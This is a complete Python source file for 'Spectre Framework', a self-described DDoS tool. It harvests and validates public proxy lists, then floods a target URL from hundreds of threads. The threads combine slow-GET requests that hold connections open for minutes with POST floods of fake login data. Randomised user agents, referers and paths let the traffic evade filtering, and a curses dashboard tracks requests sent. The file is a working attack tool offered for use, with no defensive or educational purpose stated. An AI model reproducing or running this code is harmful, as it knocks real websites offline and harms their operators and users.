#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
[ S P E C T R E   F R A M E W O R K ]
Advanced Multi-Vector DDoS Tool with Real-time Dashboard
Author: Blackhatsense
Description: A powerful, stealthy, and evasive connection and application layer
             exhaustion tool. It combines slow attacks with POST floods and
             advanced spoofing techniques.
"""

import os
import sys
import time
import random
import threading
import argparse
import curses
from urllib.parse import urlparse
import socket

# --- External Libraries ---
try:
    import httpx
    from fake_useragent import UserAgent
except ImportError:
    print("[!] Required libraries not found. Install them with:")
    print("    pip3 install httpx fake-useragent")
    sys.exit(1)

# --- UI Colors for Dashboard ---
class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'

# --- Configuration & Components ---

class ProxyManager:
    def __init__(self):
        self.raw_proxies = []
        self.validated_proxies = []
        self.lock = threading.Lock()

    def fetch(self):
        proxy_sources = [
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
            'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
        ]
        print(f"{Colors.YELLOW}[*] Fetching proxies...{Colors.RESET}")
        for source in proxy_sources:
            try:
                with httpx.Client(timeout=10) as client:
                    r = client.get(source)
                    if r.status_code == 200:
                        found = [line.strip() for line in r.text.splitlines() if ':' in line]
                        self.raw_proxies.extend(found)
            except Exception:
                pass
        self.raw_proxies = list(set(self.raw_proxies))
        print(f"{Colors.GREEN}[+] Total unique raw proxies: {len(self.raw_proxies)}{Colors.RESET}")

    def _validate_proxy(self, proxy):
        try:
            with httpx.Client(proxies=f"http://{proxy}", timeout=8) as client:
                r = client.get("http://httpbin.org/ip")
                if r.status_code == 200:
                    with self.lock:
                        self.validated_proxies.append(proxy)
                    return True
        except Exception:
            pass
        return False

    def validate(self, threads=50):
        if not self.raw_proxies:
            self.fetch()
        print(f"{Colors.YELLOW}[*] Validating {len(self.raw_proxies)} proxies with {threads} threads...{Colors.RESET}")
        self.validated_proxies = []
        threads_list = []
        for proxy in self.raw_proxies:
            t = threading.Thread(target=self._validate_proxy, args=(proxy,))
            t.daemon = True
            t.start()
            threads_list.append(t)
            if len(threads_list) >= threads:
                for t_thread in threads_list:
                    t_thread.join()
                threads_list = []
        
        for t_thread in threads_list:
            t_thread.join()

        print(f"{Colors.GREEN}[+] Validation complete. {len(self.validated_proxies)} live proxies.{Colors.RESET}")
        return self.validated_proxies

class HeaderGenerator:
    def __init__(self):
        self.ua = UserAgent()
        self.referers = [
            "https://www.google.com/search?q=",
            "https://www.facebook.com/",
            "https://www.twitter.com/",
            "https://www.reddit.com/",
        ]

    def get(self, target_host):
        return {
            "User-Agent": self.ua.random,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Referer": f"{random.choice(self.referers)}{random.randint(1000, 99999)}",
            "Cache-Control": "max-age=0",
            "Host": target_host,
        }

# --- The Core Attack Engine ---
class SpectreEngine:
    def __init__(self, target_url, proxies, threads):
        self.target_url = target_url
        self.parsed_url = urlparse(target_url)
        self.host = self.parsed_url.netloc
        self.proxies = proxies
        self.threads = threads
        self.stop_event = threading.Event()
        self.lock = threading.Lock()
        
        # Stats
        self.req_sent = 0
        self.req_failed = 0
        self.active_connections = 0
        
        self.header_gen = HeaderGenerator()

    def _get_random_proxy(self):
        if not self.proxies: return None
        return random.choice(self.proxies)

    def _get_random_path(self):
        paths = [
            "/", "/login", "/wp-admin/", "/admin", "/api/v1/users", "/search",
            "/index.html", "/contact", "/about-us", "/products", "/cart",
            f"/{random.randint(1, 999999)}.jpg", f"/{random.randint(1, 999999)}.php"
        ]
        return random.choice(paths)

    def _attack_worker(self):
        while not self.stop_event.is_set():
            proxy = self._get_random_proxy()
            if not proxy:
                time.sleep(1)
                continue
            
            headers = self.header_gen.get(self.host)
            path = self._get_random_path()
            full_url = self.target_url + path
            
            # Randomly choose attack vector
            if random.random() < 0.7: # 70% Slow GET
                self._slow_get(full_url, proxy, headers)
            else: # 30% POST Flood
                self._post_flood(full_url, proxy, headers)
            
            time.sleep(random.uniform(0.5, 2.5))

    def _slow_get(self, url, proxy, headers):
        try:
            with self.lock: self.active_connections += 1
            with httpx.Client(proxies=f"http://{proxy}", timeout=20, http2=True) as client:
                with client.stream("GET", url, headers=headers) as response:
                    response.read(1) # Read one byte to establish connection
                    with self.lock: self.req_sent += 1
                    time.sleep(random.randint(300, 600)) # Hold connection open
        except (httpx.RequestError, httpx.TimeoutException):
            with self.lock: self.req_failed += 1
        finally:
            with self.lock: self.active_connections -= 1

    def _post_flood(self, url, proxy, headers):
        try:
            with self.lock: self.active_connections += 1
            post_data = {
                "user": f"user_{random.randint(1000, 9999)}",
                "pass": f"pass_{random.randint(1000, 9999)}",
                "submit": "login"
            }
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            
            with httpx.Client(proxies=f"http://{proxy}", timeout=10, http2=True) as client:
                response = client.post(url, data=post_data, headers=headers)
                with self.lock: self.req_sent += 1
        except (httpx.RequestError, httpx.TimeoutException):
            with self.lock: self.req_failed += 1
        finally:
            with self.lock: self.active_connections -= 1

    def start(self):
        for _ in range(self.threads):
            t = threading.Thread(target=self._attack_worker)
            t.daemon = True
            t.start()

    def stop(self):
        self.stop_event.set()

# --- The Real-time Dashboard ---
class SpectreDashboard:
    def __init__(self, engine):
        self.engine = engine
        self.stdscr = None

    def _draw(self):
        self.stdscr.clear()
        h, w = self.stdscr.getmaxyx()
        
        # Title
        title = " S P E C T R E   F R A M E W O R K "
        self.stdscr.addstr(0, (w // 2) - len(title) // 2, title, curses.color_pair(1) | curses.A_BOLD)
        
        # Status Box
        status_text = "RUNNING" if not self.engine.stop_event.is_set() else "STOPPED"
        status_color = curses.color_pair(2) if not self.engine.stop_event.is_set() else curses.color_pair(3)
        self.stdscr.addstr(2, 2, "Status:", curses.A_BOLD)
        self.stdscr.addstr(2, 10, status_text, status_color | curses.A_BOLD)
        
        # Stats Box
        self.stdscr.addstr(4, 2, "--- Statistics ---", curses.A_BOLD)
        self.stdscr.addstr(5, 2, f"Target URL: {self.engine.target_url}")
        self.stdscr.addstr(6, 2, f"Threads:    {self.engine.threads}")
        self.stdscr.addstr(7, 2, f"Proxies:    {len(self.engine.proxies)}")
        self.stdscr.addstr(8, 2, f"Active Con: {self.engine.active_connections}")
        self.stdscr.addstr(9, 2, f"Req Sent:   {self.engine.req_sent}")
        self.stdscr.addstr(10, 2, f"Req Failed: {self.engine.req_failed}")
        
        rps = self.engine.req_sent / max(1, time.time() - self.start_time)
        self.stdscr.addstr(11, 2, f"Req/s:      {rps:.2f}")
        
        # Instructions
        self.stdscr.addstr(h-2, 2, "Press 'q' to stop and exit.", curses.A_DIM)
        
        self.stdscr.refresh()

    def _run_loop(self):
        self.start_time = time.time()
        while not self.engine.stop_event.is_set():
            try:
                self._draw()
                time.sleep(1)
            except curses.error:
                break

    def start(self):
        self.stdscr = curses.initscr()
        curses.start_color()
        curses.use_default_colors()
        curses.curs_set(0)
        curses.noecho()
        self.stdscr.nodelay(1)
        
        # Color pairs
        curses.init_pair(1, curses.CYAN, curses.COLOR_BLACK)
        curses.init_pair(2, curses.GREEN, curses.COLOR_BLACK)
        curses.init_pair(3, curses.RED, curses.COLOR_BLACK)
        
        try:
            self._run_loop()
        finally:
            curses.endwin()

# --- Main Execution ---
def main():
    parser = argparse.ArgumentParser(description="Spectre DDoS Framework")
    parser.add_argument("url", help="Target URL (e.g., https://example.com)")
    parser.add_argument("-t", "--threads", type=int, default=300, help="Number of attack threads (default: 300)")
    parser.add_argument("--no-ui", action="store_true", help="Run without the real-time dashboard")
    args = parser.parse_args()

    if os.name == 'nt':
        print(f"{Colors.YELLOW}[-] This script is best run on a Linux VPS for optimal performance.{Colors.RESET}")

    # Initialize components
    proxy_manager = ProxyManager()
    valid_proxies = proxy_manager.validate()
    
    if not valid_proxies:
        print(f"{Colors.RED}[-] No valid proxies found. Cannot start attack.{Colors.RESET}")
        sys.exit(1)

    engine = SpectreEngine(args.url, valid_proxies, args.threads)
    
    print(f"{Colors.GREEN}[+] Engine initialized. Starting attack on {args.url}{Colors.RESET}")
    engine.start()

    if args.no_ui:
        print(f"{Colors.YELLOW}[*] Attack running in background. Press Ctrl+C to stop.{Colors.RESET}")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Stopping attack...{Colors.RESET}")
            engine.stop()
    else:
        dashboard = SpectreDashboard(engine)
        dashboard.start()
        engine.stop()

    print(f"{Colors.GREEN}[+] Attack stopped. Final stats:{Colors.RESET}")
    print(f"    Requests Sent: {engine.req_sent}")
    print(f"    Requests Failed: {engine.req_failed}")

if __name__ == "__main__":
    main()
